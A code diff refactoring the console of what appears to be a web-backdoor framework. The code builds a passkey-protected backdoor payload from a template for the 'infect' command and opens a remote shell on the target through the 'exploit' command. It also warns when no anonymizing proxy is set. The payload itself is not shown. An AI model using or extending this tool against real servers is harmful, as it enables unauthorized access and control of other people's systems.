@@ -13,6 +13,7 @@ class Start(interface.cmdlib.Cmd):
         mainShellHelp = getpath('misc/txt/mainShell_help.msg').read().strip()
         self.help     = P_NL+mainShellHelp+P_NL
 
+        # print intro and help
         print softwareLogo
         print ''
         print color(1)
@@ -23,52 +24,61 @@ class Start(interface.cmdlib.Cmd):
         print mainShellHelp
         print ''
 
-        if 'SAVEFILE' in self.CONF['SETTINGS']:
-            print P_inf+'Using session saved from '+quot(self.CONF['SETTINGS']['SAVEFILE'])
+        # inform if using session
+        if 'SAVEFILE' in self.CNF['SET']:
+            msg = P_inf+'Using session file %s'
+            print msg % quot(self.CNF['SET']['SAVEFILE'])
 
-        if self.CONF['SETTINGS']['PROXY'].lower() in ['','none']:
-            print P_err+'No proxy configured ! use it at your own risk...'
+        # alert if no proxy
+        if self.CNF['SET']['PROXY'].lower() in ['','none']:
+            err = 'No proxy gateway ! stay carrefull...'
+            print P_err+err
 
-        if not 'OPENER' in self.CONF:
-            self.CONF['OPENER'] = dict()
-        self.updateOpener()
+        # add empty LNK if don't exist
+        if not 'LNK' in self.CNF:
+            self.CNF['LNK'] = dict()
+
+        # update the LNK
+        self.updateLNK()
 
 
-    def updateOpener(self):
-        def genHashKey():
-            domain  = self.CONF['OPENER']['DOMAIN']
+    def updateLNK(self):
+        def gen_srvhash():
+            domain  = self.CNF['LNK']['DOMAIN']
             md5     = hashlib.md5(domain)
             hexVal  = md5.hexdigest()
             b64Val  = base64.b64encode(hexVal)
-            hashkey = b64Val[:8]
-            self.CONF['OPENER']['HASH'] = hashkey
+            srvhash = b64Val[:8]
+            self.CNF['LNK']['HASH'] = srvhash
 
-        def genPayload():
-            hashkey  = self.CONF['OPENER']['HASH']
-            backdoor = self.CONF['SETTINGS']['BACKDOOR']
-            postvar  = self.CONF['SETTINGS']['PASSKEY'].upper().replace('-','_')
-            rawPayload = backdoor.replace('%%PASSKEY%%',postvar)
-            payload    = rawPayload.replace('%%SRVHASH%%',hashkey)
-            self.CONF['OPENER']['BACKDOOR'] = payload
+        def gen_payload():
+            srvhash  = self.CNF['LNK']['HASH']
+            backdoor = self.CNF['SET']['BACKDOOR']
+            passkey  = self.CNF['SET']['PASSKEY'].upper().replace('-','_')
+            rawPayload = backdoor.replace('%%PASSKEY%%',passkey)
+            payload    = rawPayload.replace('%%SRVHASH%%',srvhash)
+            self.CNF['LNK']['BACKDOOR'] = payload
 
-        self.CONF['OPENER']['DOMAIN'] = 'x'
-        target = self.CONF['SETTINGS']['TARGET']
-        domainParser = '^https?://(.+?)(?:$|/)'
-        try:    matchedDomain = re.findall(domainParser,target)[0]
-        except: matchedDomain = ''
-        if matchedDomain and len(target)>13:
-            self.CONF['OPENER']['URL']     = target
-            self.CONF['OPENER']['DOMAIN']  = matchedDomain
+        # another ugly line to shorten the function
+        self.CNF['LNK']['DOMAIN'] = 'x'
+
+        target = self.CNF['SET']['TARGET']
+        regex  = '^https?://(.+?)(?:$|/)'
+        try:    domain = re.findall(regex, target)[0]
+        except: domain = ''
+        if domain and len(target)>13:
+            self.CNF['LNK']['URL']     = target
+            self.CNF['LNK']['DOMAIN']  = domain
         else:
-            try: del self.CONF['OPENER']['URL']
+            try: del self.CNF['LNK']['URL']
             except: pass
 
-        genHashKey()
-        genPayload()
+        gen_srvhash()
+        gen_payload()
 
-        self.CONF['OPENER']['PASSKEY'] = self.CONF['SETTINGS']['PASSKEY']
-        if self.CONF['OPENER']['PASSKEY'] == "%%SRVHASH%%":
-            self.CONF['OPENER']['PASSKEY'] = self.CONF['OPENER']['HASH']
+        self.CNF['LNK']['PASSKEY'] = self.CNF['SET']['PASSKEY']
+        if self.CNF['LNK']['PASSKEY'] == "%%SRVHASH%%":
+            self.CNF['LNK']['PASSKEY'] = self.CNF['LNK']['HASH']
 
 
     ######################
@@ -76,7 +86,7 @@ class Start(interface.cmdlib.Cmd):
     def do_clear(self, line):
         clear()
         import pprint
-        pprint.pprint(self.CONF)
+        pprint.pprint(self.CNF)
 
     #####################
     ### COMMAND: exit ###
@@ -97,7 +107,7 @@ class Start(interface.cmdlib.Cmd):
         print '         set PROXY None'
 
     def complete_set(self, text, line, begidx, endidx):
-        completions = self.CONF['SETTINGS'].keys()
+        completions = self.CNF['SET'].keys()
         if text:
             completions = [x+' ' for x in completions if x.startswith(text)]
         return(completions)
@@ -111,22 +121,22 @@ class Start(interface.cmdlib.Cmd):
             args = line.strip().split(' ')
             var  = args[0].upper()
             val  = ' '.join(args[1:])
-            if var in self.CONF['SETTINGS']:
+            if var in self.CNF['SET']:
                 if val:
-                    oldValue = self.CONF['SETTINGS'][var]
-                    self.CONF['SETTINGS'][var] = val
+                    oldValue = self.CNF['SET'][var]
+                    self.CNF['SET'][var] = val
                     import usr.settings
-                    if usr.settings.matchConditions(self.CONF['SETTINGS']):
-                        showStatus(var, self.CONF['SETTINGS'][var])
-                        self.updateOpener()
+                    if usr.settings.matchConditions(self.CNF['SET']):
+                        showStatus(var, self.CNF['SET'][var])
+                        self.updateLNK()
                     else:
-                        self.CONF['SETTINGS'][var] = oldValue
+                        self.CNF['SET'][var] = oldValue
                 else:
-                    showStatus(var, self.CONF['SETTINGS'][var])
+                    showStatus(var, self.CNF['SET'][var])
             else:
                 self.help_set()
         else:
-            items = self.CONF['SETTINGS'].items()
+            items = self.CNF['SET'].items()
             sortedSettings = dict([(x.upper(),y) for x,y in items])
             import interface.columnizer
             title = "Session settings"
@@ -135,8 +145,8 @@ class Start(interface.cmdlib.Cmd):
     #######################
     ### COMMAND: infect ###
     def do_infect(self, line):
-        if 'URL' in self.CONF['OPENER'] or self.CONF['SETTINGS']['PASSKEY'] != '%%SRVHASH%%':
-            payload = self.CONF['OPENER']['BACKDOOR']
+        if 'URL' in self.CNF['LNK'] or self.CNF['SET']['PASSKEY'] != '%%SRVHASH%%':
+            payload = self.CNF['LNK']['BACKDOOR']
             length  = len(payload)
             print ''
             print 'To infect the current target'
@@ -152,14 +162,14 @@ class Start(interface.cmdlib.Cmd):
     ########################
     ### COMMAND: exploit ###
     def do_exploit(self, line):
-        if 'URL' in self.CONF['OPENER']:
+        if 'URL' in self.CNF['LNK']:
             import framework.exploit
-            exploitation = framework.exploit.Start(self.CONF)
+            exploitation = framework.exploit.Start(self.CNF)
             if exploitation.success:
-                self.CONF['SERVER'] = exploitation.SERVER
+                self.CNF['SRV'] = exploitation.remotevars
                 import remoteShell
                 shell = remoteShell.Start()
-                shell.setConfig(self.CONF)
+                shell.setConfig(self.CNF)
                 shell.cmdloop()
                 exploitation.close()
         else:
@@ -169,6 +179,6 @@ class Start(interface.cmdlib.Cmd):
     ### COMMAND: save ###
     def do_save(self, line):
         import usr.session
-        savedFile = usr.session.save(self.CONF, line)
+        savedFile = usr.session.save(self.CNF, line)
         if savedFile:
-            self.CONF['SETTINGS']['SAVEFILE'] = savedFile
+            self.CNF['SET']['SAVEFILE'] = savedFile
